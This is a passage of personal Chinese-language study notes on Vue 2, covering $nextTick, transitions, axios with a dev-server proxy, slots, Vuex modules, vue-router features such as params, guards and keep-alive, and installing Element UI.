      			//编辑框内显示的的值
              :value='todo.title'
              ref="inputTitle"
                     //失去焦点时触发的事件
              @blur='cancelEdit(todo,$event)'>
            </label>

            <button class="btn btn-danger" style="" 
            @click='handleDelete(todo.id)'>删除</button>
            <button class="btn btn-editor" style="" 
            @click='handleEditor(todo)'>修改</button>
            <!-- 用父组件的handleDelete函数 -->
          </li>
   </div>
</template>
```

使用$nextTick 实现消息订阅 这里发布消息

如果我们没有使用`$nextTick`。那么在方法中调用.focus()的代码将会无效。

 因为:

​		在方法中我们使用.focus()获取焦点,但是在方法调用之后如果vue发现数据更新了。vue将会再次更新dom

这样我们的.focus()就是无效的。

所以: 

​		我们必须把有关dom的操作放在 `$nextTick`的回调函数中。vue在更新完成dom后，会回过头来调用我们的.focus()这样获取焦点是有效的

```js
        // 处理编辑
        handleEditor(todo){
            this.$set(todo,'isEdit',true)
            // 让编辑框获取焦点
            // 使用定时器当vue解析完成模板 页面出现这个元素之后 才能获取焦点
            // setTimeout(() => {
            //     this.$refs.inputTitle.focus()
            // }, 100);

            // nextTick等dom更新完毕再执行这个回调函数
            this.$nextTick(function(){
                this.$refs.inputTitle.focus()
            })
        },
        //失去焦点时更改数据
        cancelEdit(todo,event){
            // 发布一个消息
          console.log(event.target.value);
          pubsub.publish('editMessage'{'todo':todo,'value':event.target.value})
            todo.isEdit = false;

        }
```



这里订阅消息

```js
            pubsub.subscribe('editMessage',(name,data)=>{
                console.log('@',data);
               data.todo.title = data.value;
                // todo.title=value;
            })
```

![image-20221118202320897](E:\typora\homework\img\vue\image-20221118202320897.png)

![image-20221118202344497](E:\typora\homework\img\vue\image-20221118202344497.png)

### 3.12动画与过度

第三方动画库`animate.css`

**安装引入**

```shell
npm install animate.css


//引入
import 'animate.css'
```



在`transition-group`中使用这个动画库

```html
        <transition-group name='animate__animated animate__bounce' appear
            enter-active-class="animate__rubberBand" 
            leave-active-class="animate__rotateOutDownRight"
        >
           <h1 key='1'  v-show='!isExit'>11</h1>
           <h1 key='2'  v-show='!isExit'>都打</h1>
        </transition-group>
```

动画效果

![image-20221118212155822](E:\typora\homework\img\vue\image-20221118212155822.png)

#### 3.12.2 给todoList添加动画

用`transition-group`标签包裹需要动画的元素

```html
            <transition-group name='todo' appear>
                <EachComponent v-for="todo in todos" :key='todo.id'
                v-bind:todo='todo'></EachComponent>
            </transition-group>
```

**在`style`中配置我们的动画**

```css
    .todo-enter-active {
        animation: todo 0.3s linear;
    }
    .todo-leave-active {
        animation: todo 0.3s linear reverse;
    }
    @keyframes todo {
        from{
            transform:translateX(-100%);
        }
        to{
            transform:translateX(0%);
        }
    }
```

##  第四章 VUE中的ajax

### 4.1 vue脚手架配置代理解决前端跨域

当前端服务器所处的ip端口和请求的ip端口不同时会请求失败，产生一个跨域的问题

![image-20221121151711745](E:\typora\homework\img\vue\image-20221121151711745.png)

常用发送网络请求的前端库,vue中推荐使用axios

![image-20221121151903148](E:\typora\homework\img\vue\image-20221121151903148.png)





```
//安装
npm i axios

//导入
import axios from "axios";
```



向服务器发送网络请求

```js
     export default{
        name:'App',
        methods: {
            getStudent(){
                axios.get("http://localhost:8080/demo/students").then(
            //请求成功的回调
                response=>{
                    console.log('请求成功了',response.data);
                },
                // 请求失败的回调
                error=>{
                    console.log('请求失败了',error.message);
                })
          },
          getCar(){
                axios.get("http://localhost:8080/demo1/cars").then(
            //请求成功的回调
                response=>{
                    console.log('请求成功了',response.data);
                },
                // 请求失败的回调
                error=>{
                    console.log('请求失败了',error.message);
                })
          }
        }
     }
```



使用`VUE-CLI`推荐的解决跨域问题在`vue.config.js`配置

```js
  /*
  //配置之后所有的请求将会 由代理服务器转发给 http://localhost:5000
  devServer: {
    proxy: 'http://localhost:5000'
  }*/

  //第二种开启代理服务器方式解决跨域问题
  devServer: {
    proxy: {
      '/demo': {
        target: 'http://localhost:5000',
        pathRewrite:{'^/demo':''},
        //websocket
        ws: true,
        // true 修改host 为目标服务器的地址
        changeOrigin: true
      },
      '/demo1': {
        target: 'http://localhost:5001',
        pathRewrite:{'^/demo1':''},
        //websocket
        ws: true,
        // true 修改host 为目标服务器的地址
        changeOrigin: true
      }
    }
  }
```





![image-20221121153515690](E:\typora\homework\img\vue\image-20221121153515690.png)



![image-20221121153541367](E:\typora\homework\img\vue\image-20221121153541367.png)

### 4.2 github获取用户名小案例

获取数据

```vue
<template lang="">
    <div>
        <div class="container">
            <div class="row"></div>
            <div class="card" v-for='user in userList' :key="user.id">
                <a  :href="user.html_url" target="_blank">
                <img  v-bind:src='user.avatar_url' style='width: 100px'/>
                </a>
                <p class="card-text">{{user.login}}</p>
            </div>
        </div>
    </div>
</template>
<script>

export default {
    name:'SchoolComponent',
    data() {
        return {
            userList : []
        }
       
    },
    mounted() {
            this.$bus.$on('receiveUsers',users =>{
                this.userList = users.items;

                // console.log(users);
            })
        },

}
</script>
```

```
<template lang="">
    <div>
        <section class="jumbotron">
            <h3 class="jumbotron-heading">Search Github Users</h3>
            <div>
                <input type="text" placeholder="enter the name you search" v-model='keyWord'/>&nbsp;
                <button @click='search'>Search</button>
            </div>
        </section>
    </div>
</template>
<script>
      import axios from 'axios'
    export default {
        name:'StudentComponent',
        data() {
            return {
                keyWord:''
            }
        },
        methods: {
            search(){
            
                axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
                    response=>{
                    // console.log('请求成功',response.data);
                    this.$bus.$emit('receiveUsers',response.data);
                    },
                    error =>{
                    console.log('请求失败',error.message)
                    })
            },

        },
    }

</script>
```

![image-20221121192302798](E:\typora\homework\img\vue\image-20221121192302798.png)

### 4.3插槽的使用

#### 4.3.1匿名插槽

匿名插槽的使用挖个坑 东西都放里面

```html
    <div class="constant">
        <CategoryComponent>
            <img src="https://sponsors.vuejs.org/images/volta.svg"  width='200px' height="200px" alt="">
        </CategoryComponent>
        <CategoryComponent>
            <li v-for="(item, index) in users" :key="index">{{item}}</li>
        </CategoryComponent>
        <CategoryComponent></CategoryComponent>
    </div>
```

在模板中定义一个插槽

```vue
<template lang="">
    <div class="category">
        <h2>分类</h2>
        <ul>
            <!-- 一个默认插槽  组件实例传过来的会放在这里-->
        <slot></slot>
        </ul>
    </div>
</template>
```

#### 4.3.2具名插槽

有名字的插槽 一个萝卜一个坑

```html
 <slot name="once"> 没有东西就显示这行字</slot>
```



```html
        <CategoryComponent>
             <div slot="once">
                 <h1>大帅</h1>
                 <h1>小帅</h1>
                 <h1>二帅</h1>
             </div>
        </CategoryComponent>
```



template专属写法

```html
        <CategoryComponent>
            <template v-slot:once>
                <h1>大帅</h1>
                <h1>小帅</h1>
                <h1>二帅</h1>
            </template>
       </CategoryComponent>
```

#### 4.3.3作用域插槽

**在需要数据的组件中配置 scope**

```html
        <CategoryComponent>
            <template scope="study">
                <ol>
                    <li v-for="(item, index) in study.games" :key="index">{{item}}</li>
                </ol>
            </template>
        </CategoryComponent>
```



把数据给插槽的使用者

```html
  <slot :games="games"></slot>
```

总结:

![image-20221121204328668](E:\typora\homework\img\vue\image-20221121204328668.png)





![image-20221121204400532](E:\typora\homework\img\vue\image-20221121204400532.png)



## 第五章 VUEX

[Vuex官方文档](https://vuex.vuejs.org/zh/)

### 5.1多件组通信

使用全局事件总线进行数据共享如果数据比较多会很混乱

![image-20221122152414071](E:\typora\homework\img\vue\image-20221122152414071.png)

使用vuex来管理全局数据

![image-20221122152514785](E:\typora\homework\img\vue\image-20221122152514785.png)



#### 5.1.1vuex 数据共享原理

![image-20221122153513280](E:\typora\homework\img\vue\image-20221122153513280.png)

#### 5.1.2具体在vue脚手架中的代码实现

创建一个`store`文件夹里面放`index.js`这是官方推荐写法

![image-20221122153711116](E:\typora\homework\img\vue\image-20221122153711116.png)



在`index.js`中引入VUE 并且use(Vuex)是因为预编译 import都会被放在最前面执行

如果在mian.js中use(Vuex) 就会产生 `use(Vuex)`还没有执行

就执行了`new Vuex.Store`

![image-20221122154301894](E:\typora\homework\img\vue\image-20221122154301894.png)



正确做法如下

```js
//index.js
// 创建vuex中最为核心的store

//引入vuex
import Vuex from 'vuex'

//引入vue
import Vue from 'vue'
// 插件方式使用Vuex
Vue.use(Vuex)
//创建并暴露store
export default new Vuex.Store({
   //准备actions 用于响应组件中的动作
    actions:{
        add(context,value){
            console.log('actions中的add被调用了',context)
            
            context.commit('ADD',value);
        },
        waitAdd(context,value){
            setTimeout(()=>{
                console.log('actions中的waitAdd被调用了',context)
                context.commit('WAIT_ADD',value);
            },500)
        
        }
    },
    // 准备mutations 用于操作数据
    mutations:{
        ADD(state,value){
            console.log('mutations中的ADD被调用了',state)
            state.sum+=value;
        },
        WAIT_ADD(state,value){
            console.log('mutations中的WAIT_ADD被调用了',state)
            state.sum+=value;
        }
    },
    //准备state 用于存储数据
    state:{
        sum:0
    }
})

```

main.js

```js
//该文件是整个项目入口文件
//引入vue
import Vue from 'vue'

//引入app组件 它是所有组件的父组件
import App from './App.vue'

//引入store 下的index.js
import store from './store'

Vue.config.productionTip = false
//创建vue实例


new Vue({
  //这是一个语法糖
  // render: h => h(App),
  store:store,

  render: function(createElement){
    return createElement(App);
  },

}).$mount('#app')

```

#### 5.1.3`store`对象

![image-20221122154736591](E:\typora\homework\img\vue\image-20221122154736591.png)



`actions`中动作的第一个参数是context 第二个参数是调用动作时传过来的值



 和`mutations`中的动作第一个参数是state 第二个参数是由`actions`中动作所传递的参数

![image-20221122155137179](E:\typora\homework\img\vue\image-20221122155137179.png)



### 5.2 get计算属性

#### 5.2.1使用getter()  store 的计算属性

有时候我们需要从 store 中的 state 中派生出一些状态，例如对列表进行过滤并计数：

```js
computed: {
  doneTodosCount () {
    return this.$store.state.todos.filter(todo => todo.done).length
  }
}
```

如果有多个组件需要用到此属性，我们要么复制这个函数，或者抽取到一个共享函数然后在多处导入它——无论哪种方式都不是很理想。

Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。



Getter 接受 state 作为其第一个参数：

```js
const store = createStore({
  state: {
    todos: [
      { id: 1, text: '...', done: true },
      { id: 2, text: '...', done: false }
    ]
  },
  getters: {
    doneTodos (state) {
      return state.todos.filter(todo => todo.done)
    }
  }
})
```

[通过属性访问](https://vuex.vuejs.org/zh/guide/getters.html#通过属性访问)

Getter 会暴露为 `store.getters` 对象，你可以以属性的形式访问这些值：

```js
store.getters.doneTodos // -> [{ id: 1, text: '...', done: true }]
```

Getter 也可以接受其他 getter 作为第二个参数：

```js
getters: {
  // ...
  doneTodosCount (state, getters) {
    return getters.doneTodos.length
  }
}
store.getters.doneTodosCount // -> 1
```

我们可以很容易地在任何组件中使用它：

```js
computed: {
  doneTodosCount () {
    return this.$store.getters.doneTodosCount
  }
}
```

注意，getter 在通过属性访问时是作为 Vue 的响应式系统的一部分缓存其中的。

**通过方法访问**

你也可以通过让 getter 返回一个函数，来实现给 getter 传参。在你对 store 里的数组进行查询时非常有用。

```js
getters: {
  // ...
  getTodoById: (state) => (id) => {
    return state.todos.find(todo => todo.id === id)
  }
}
store.getters.getTodoById(2) // -> { id: 2, text: '...', done: false }
```

注意，getter 在通过方法访问时，每次都会去进行调用，而不会缓存结果。



#### 5.2.2 mapState和mapGetters

```js
    computed:{
        // 从state中读取数据
        ...mapState({count:'sum'}),
        // 从getters中读取数据
        ...mapGetters({doubleSum:'doubleSum'})
    },
```

![image-20221122171647092](E:\typora\homework\img\vue\image-20221122171647092.png)

#### 5.2.3 mapActions和mapMutations

![image-20221122212930166](E:\typora\homework\img\vue\image-20221122212930166.png)

### 5.3 vuex多组件间共享数据

`PersonComponent`生成数据交给vuex管理

```vue
<template lang="">
    <div class="category">
        <h2>人员列表</h2>
        <input type="text" v-model="keyWord">
        <button @click='add'>点我新增</button>
        <ol>
            <li v-for="(person) in persons" :key="person.id">{{person.name}}</li>
        </ol>
    </div>
</template>
<script>
import {mapState } from 'vuex'
import {nanoid} from 'nanoid';
    export default {
        name:'StudentComponent',
        data() {
            return {
                keyWord:'',
               
            }
        },
        methods: {
            add(){
                // commit新数据 给ADD_PERSON
                this.$store.commit('ADD_PERSON',{id:nanoid(),name:this.keyWord})
            }
        },
        computed:{
            //通过映射读取数据
            ...mapState({persons:'personList'})
        }
    }

</script>
```

`index.js` 中配置数据

```js
    mutations:{
        //处理提交的数据
        ADD_PERSON(state,value){
            state.personList.unshift(value);
        }
    },
    //准备state 用于存储数据
    state:{
        personList:[]
    },
```

`CountComponent`中读取使用数据

```vue
<template lang="">
    <div>
        <div class="">
            <h1>一共多少个帅比{{persons.length}}</h1>
        </div>
    </div>
</template>

<script>
import { mapGetters,mapState } from 'vuex'
export default {
    name:'SchoolComponent',
    data() {
        return {
            userList : [],
            n:0,
        }
       
    },
    methods: {
        store() {
            console.log(this.$store);
        },
        add(){
            // 直接调用commit 通知mutation修改数据
            // this.$store.commit('ADD',this.n);
            this.$store.state.sum+=this.n;
        },
        // 调用dispatch 通知actions 在actions之中可以处理一些业务逻辑
        waitAdd(){
            this.$store.dispatch('waitAdd',this.n);
        }

    },
    computed:{
        // 从state中读取数据
        ...mapState({count:'sum',persons:'personList'}),
        // 从getters中读取数据
        ...mapGetters({doubleSum:'doubleSum'})
    },

}
</script>
```

### 5.4 vuex module

由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。

为了解决以上问题，Vuex 允许我们将 store 分割成**模块（module）**。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：

在`index.js`中配置

```js
// 创建vuex中最为核心的store

//引入vuex
import Vuex from 'vuex'

//引入vue
import Vue from 'vue'

Vue.use(Vuex)
const countModel = {
    namespaced:true,
    actions:{
        add(context,value){
            console.log('actions中的add被调用了',context)
            
            context.commit('ADD',value);
        },
        waitAdd(context,value){
            setTimeout(()=>{
                console.log('actions中的waitAdd被调用了',context)
                context.commit('WAIT_ADD',value);
            },500)
        
        }
    },
    mutations:{
        ADD(state,value){
            console.log('mutations中的ADD被调用了',state,value)
            state.sum+=value;
        },
        WAIT_ADD(state,value){
            console.log('mutations中的WAIT_ADD被调用了',state)
            state.sum+=value;
        },
    },
    state:{
        sum:0,
    },
    getters:{
        doubleSum (state) {
            return state.sum*2;
        }
    }
}
const personModel={
    namespaced:true,
    //准备actions 用于响应组件中的动作
    actions:{

    },
    // 准备mutations 用于操作数据
    mutations:{

        ADD_PERSON(state,value){
            state.personList.unshift(value);
        }
    },
    //准备state 用于存储数据
    state:{

        personList:[]
    },
    getters: {
        personFirst(state){
            return state.personList[0];
        }
      }
}
//创建并暴露store
export default new Vuex.Store({
    modules:{
        countModel:countModel,
        personModel:personModel,
    }
})
```

#### 5.4.1命名空间`namespaced `

默认情况下，模块内部的 action 和 mutation 仍然是注册在**全局命名空间**的——这样使得多个模块能够对同一个 action 或 mutation 作出响应。Getter 同样也默认注册在全局命名空间，但是目前这并非出于功能上的目的（仅仅是维持现状来避免非兼容性变更）。必须注意，不要在不同的、无命名空间的模块中定义两个相同的 getter 从而导致错误。

式使其成为带命名空间的模块。当模块被注册后，它的所有 getter、action 及 mutation 都会自动根据模块注册的路径调整命名。

在module中namespaced:true 设为ture那么 可以用下面方式使用`state`

```js
import { mapGetters,mapState,mapMutations,mapActions } from 'vuex'
export default {
    name:'SchoolComponent',
    data() {
        return {
            userList : [],
            n:0,
        }
       
    },
    methods: {
        store() {
            console.log(this.$store);
        },
        // 获取指定module 中的actions方法
        ...mapActions('countModel',{waitAdd:'waitAdd'}),

        //获取指定module 中mutations方法
        ...mapMutations('countModel',{add:'ADD'})

    },
    computed:{
        // 从state中读取数据
        ...mapState('countModel',{count:'sum',persons:'personList'}),
        // 从getters中读取数据
        ...mapGetters('countModel',{doubleSum:'doubleSum'}),
    },
    mounted() {
        },

}
```

**全局下寻找模块中的对象**

```js
        methods: {
            add(){
                // commit新数据 给ADD_PERSON 使用模块换后需要/区分模块 名和方法名
                this.$store.commit('personModel/ADD_PERSON',{id:nanoid(),name:this.keyWord})
            }
        },
        computed:{
            // ...mapState({persons:'personList'})
            persons(){
                return this.$store.state.personModel.personList;
            },
            firstPerson(){
                return this.$store.getters['personModel/personFirst']
            }
        }
```

## 第六章 Vue router

### 6.1router的理解

![image-20221124133742578](E:\typora\homework\img\vue\image-20221124133742578.png)



vue 中的路由就是配置 一对键和组件的映射



![image-20221124133824975](E:\typora\homework\img\vue\image-20221124133824975.png)



#### 6.1.1安装 vuerouter

`@3`是指安装3版本的vuerouter 使用vue2只能用3版本的router

最新的4版本 只能在vue3中使用

```linux
npm install vue-router@3
```





#### 6.1.2配置路由器

创建路由器配置文件` index.js`,然后在`main.js`中引入并且配置到vue中

![image-20221124154319082](E:\typora\homework\img\vue\image-20221124154319082.png)



```js
// 该文件专门用于创建整个路由器
import VueRouter from 'vue-router'
// 引入组件
import AboutComponent from '../components/AboutComponent'
import HomeComponent from '../components/HomeComponent'
// 创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component: AboutComponent,
        },
        {
            path:'/home',
            component: HomeComponent,
        }
    ]
})
```

`main.js`中配置

```js
import Vue from 'vue'
//引入app组件 它是所有组件的父组件
import App from './App.vue'

import VueRouter from 'vue-router'
import router from './router'

Vue.config.productionTip = false
//创建vue实例
Vue.use(VueRouter)

new Vue({
  //这是一个语法糖
  // render: h => h(App),
  render: function(createElement){
    return createElement(App);
  },
  router: router,
}).$mount('#app')

```

#### 6.1.3路由器的使用

`router-link` 标签 在路由中使用用来替代`<a>`标签

`router-view` 标签在路由时路由组件所呈现的位置

```html
        <div class="row">
          <div class="col-xs-2 col-xs-offset-2">
            <div class="list-group">
              <!-- <a class="list-group-item active" href="./about.html">About</a>
              <a class="list-group-item" href="./home.html">Home</a> -->

              <!-- vue中替代a标签的 实现路由的切换 -->
              <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
              <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>


            </div>
          </div>
          <div class="col-xs-6">
            <div class="panel">
              <div class="panel-body">
                <!-- <h2>我是About的内容</h2> -->
                <!-- 指定组件的呈现位置 -->
                <router-view></router-view>
              </div>
            </div>
          </div>
        </div>
```

#### 6.1.4路由器组件会在切换后销毁

**路由中的组件在发生切换之后会销毁**

![image-20221124155526287](E:\typora\homework\img\vue\image-20221124155526287.png)

![image-20221124155617487](E:\typora\homework\img\vue\image-20221124155617487.png)

#### 6.1.5路由器组件与一般组件的区别

路由器组件有`$route`属性 和`$router` 属性

![image-20221124160410440](E:\typora\homework\img\vue\image-20221124160410440.png)

### 6.2 多级(嵌套)路由 

**配置一个二级路由 使用`children`**

```js
    routes:[
        {
            path:'/about',
            component: AboutComponent,
            //配置子路由
            children:[
                {
                    path:'message', //二级路由不加/ 不能写成：/news
                    component: MessageComponent
                },
               {
                    path:'news',
                    component: NewsComponent
               }

            ]
        },
        {
            path:'/home',
            component: HomeComponent,
        }
    ]
```



**二级路由使用时 需要带上父组件的路径**

![image-20221124163350892](E:\typora\homework\img\vue\image-20221124163350892.png)

### 6.3路由传递query参数

传递参数

```html
            <!-- :to="" 会把双引号中的值当做 js代码解析 `模板字符串`可以替换其中的js变量 -->
            <router-link :to="`/about/message/detail?so=${item.id}`">{{item.message}}</router-link>&nbsp;&nbsp;


            <!-- 对象写法 -->
            <router-link :to="{
                path:'/about/message/detail',
                query:{
                    so:item.id,
                }
            }">
            {{item.message}}
        </router-link>&nbsp;&nbsp;
```

接收参数

```js
//在模板中
{{$route.query.so}}
```

区别

##### （1）params传参

只能用 name，不能用 path。

地址栏不显示参数名称 id，但是有参数的值。

##### （2）query传参

name 和 path 都能用。用 path 的时候，提供的 path 值必须是相对于根路径的相对路径，而不是相对于父路由的相对路径，否则无法成功访问。

地址栏显示参数格式为?id=0&code=1




### 6.4 命名路由

命名路由可以简化路由的跳转

1.给路由命名

```js
    routes:[
        {
            path:'/about',
            component: AboutComponent,
            children:[
                {
                    path:'message',
                    component: MessageComponent,
                    children:[
                        {
                            name:'thin',
                            path:'detail',
                            component:DetailComponent
                        }
                    ]
                },
               {
                    path:'news',
                    component: NewsComponent
               }

            ]
        },
        {
            path:'/home',
            component: HomeComponent,
        }
    ]
```

2.简化跳转

```html
            <router-link :to="{
                name:'thin',
                query:{
                    so:item.id,
                }
            }">
            {{item.message}}
        </router-link>
```

### 6.5路由传递 params参数

1 在路由配置中声明占位符并且配置name

```js
    routes:[
        {
            path:'/about',
            component: AboutComponent,
            children:[
                {
                    path:'message',
                    component: MessageComponent,
                    children:[
                        {
                            name:'thin',
                            path:'detail/:so',//声明占位符
                            component:DetailComponent
                        }
                    ]
                }

            ]
        }
    ]
```

2 pararms方式传递参数

```html
  
            <!-- 对象写法 -->
            <router-link :to="{
                              //这里必须使用name		
                name:'thin',
                params:{
                    so:item.id
                }
            }">
            {{item.message}}
        </router-link>&nbsp;&nbsp;

        <!-- params方式携带参数 -->
        <router-link :to="`/about/message/detail/${item.id}`">
          {{item.message}}
  		  </router-link>&nbsp;&nbsp;
```

**路由携带params参数时 若使用to的对象写法 则不能使用path配置项 必须使用name配置项**

3.接收参数

```html
 <li><h2>{{$route.params.so}}</h2></li>
```

### 6.6 路由props配置

可以让路由更方便接收参数

1.配置props属性

![image-20221124213628810](E:\typora\homework\img\vue\image-20221124213628810.png)

2.在路由组件中使用props

```vue
<template lang="">
    <h1>{{id}}</h1>
	<h1>{{title}}</h1>
</template>           


export default {
    name:'DetailComponent',

    props:['id','title']
}
```

### 6.7 `<router-link>`的replace属性

1.作用:控制路由跳转时操作浏览器历史记录的模式

2.浏览器的历史记录 有两种写入方式 分别为`push`和`replace`     `replace`是替换当前记录，路由跳转默认为`push`

3如何开启 `replace`模式:

```html
 <router-link replace ></router-link>
```

### 6.8 编程式路由导航

1 作用 不借助`<router-link>`实现路由跳转,让路由跳转更加灵活

2 编码

```js
        pushShow(item){
            this.$router.push({
                name:'gao',
                query:{
                    id:item.id,
                    message:item.message
                }
            })
        },
        replaceShow(item){
            this.$router.replace({
                name:'gao',
                query:{
                    id:item.id,
                    message:item.message
                }
            })
        }
```

浏览器中的前进和后退

$router.back()

$router.forward()

### 6.9缓存路由组件

作用:让不展示的路由组件保持挂载，不被销毁。

为了不清理掉dom实例里面的内容



具体的编码

```html
                    <keep-alive include="NewsComponent">
                      <router-view></router-view>
                    </keep-alive>
```

`include`里面是组件的名称 `name:'NewsComponent'` 



有多个需要缓存的,写成数组形式

```html
                    <keep-alive :include="[NewsComponent,MessageComponent]">
                      <router-view></router-view>
                    </keep-alive>
```

### 6.10两个新的生命周期钩子

1 作用 路由组件所独有的两个钩子,用于捕获路由组件的激活状态

`activated` 组件被激活时调用

`deactivated` 组件失活时调用

```js
    activated() {
        console.log('组件被激活了');
    },
    deactivated() {
        console.log('路由组件失活了');
    },
```

### 6.11路由守卫

对路由进行权限控制

#### 6.11.1全局守卫

前置守卫

```js
const router =  new VueRouter({
    routes:[
        {
            path:'/about',
            component: AboutComponent,
            children:[
                {
                    path:'message',
                    component: MessageComponent,
                    children:[
                        {
                            name:'thin',
                            path:'detail/:so',//声明占位符
                            component:DetailComponent,
                            meta:{
                            //配置路由是否需要校验 true为需要校验
                                isAuthorize: true,
                            }
                        }
                    ]
                },
               {
                    path:'news',
                    component: NewsComponent,
                    meta:{
                        isAuthorize: true,
                    }
               }

            ]
        }
    ]
})
//初始化前置路由守卫 初始化的时候被调用,每次路由切换的前被调用
router.beforeEach((to,from,next)=>{
    //判断路由是否需要校验
    if(to.meta.isAuthorize){
        if(localStorage.getItem('school') === 'school') {
            next();
        }
    }else{
        next();
    }

    
})
export default router;
```

后置守卫

```js
// 全局后置路由守卫---初始化的时候被调用,每次路由切换之后被调用
router.afterEach(()=>{
    console.log('后置守卫');
})
```

#### 6.11.2独享路由守卫

```js
                        {
                            name:'gao',
                            path:'baby',
                            component:BabyComponent,
                            //独享路由守卫
                            beforeEnter: (to, from, next) => {
                                console.log('独享的路由守卫',to,from,next);
                                next();
                            }
                        }
```

#### 6.11.3组件内路由守卫

```js
    //通过路由规则进入该组件时调用
    beforeRouteEnter (to,from,next) {
        console.log('进入message组件');
        next();
    },
    // 通过路由规则离开该组件时被调用
    beforeRouteLeave (to,from,next) {
        console.log('离开message组件');
        next()
        // ...
    }
```

### 6.12路由器的两种工作模式

![image-20221125173915952](E:\typora\homework\img\vue\image-20221125173915952.png)

## 第七章 Vue UI组件库

### 7.1npm 安装

推荐使用 npm 的方式安装，它能更好地和 [webpack](https://webpack.js.org/) 打包工具配合使用。

```shell
npm i element-ui -S
```

### 7.2完整引入

在 main.js 中写入以下内容：

```javascript
import Vue from 'vue';
import ElementUI from 'element-ui';
import 'element-ui/lib/theme-chalk/index.css';
import App from './App.vue';

Vue.use(ElementUI);

new Vue({
  el: '#app',
  render: h => h(App)
});
```

以上代码便完成了 Element 的引入。需要注意的是，样式文件需要单独引入。





### 7.3按需引入

借助 [babel-plugin-component](https://github.com/QingWei-Li/babel-plugin-component)，我们可以只引入需要的组件，以达到减小项目体积的目的。

首先，安装 babel-plugin-component：

```bash
npm install babel-plugin-component -D
```



然后，配置`babel.config.js`为：

![image-20221125200337884](E:\typora\homework\img\vue\image-20221125200337884.png)



接下来，如果你只希望引入部分组件，比如 `Button` 和 `Row`  `DatePicker`，那么需要在 main.js 中写入以下内容：

```js
import { Button,Row,DatePicker } from 'element-ui';

// 全局注册组件
Vue.component(Button.name, Button);
Vue.component(Row.name, Row);
Vue.component(DatePicker.name,DatePicker)
/* 或写为
 * Vue.use(Button)
 * Vue.use(Select)
 */

```





**至此vue2 完结撒花 2022年11月25日20:13:52  但愿自己进步一点点**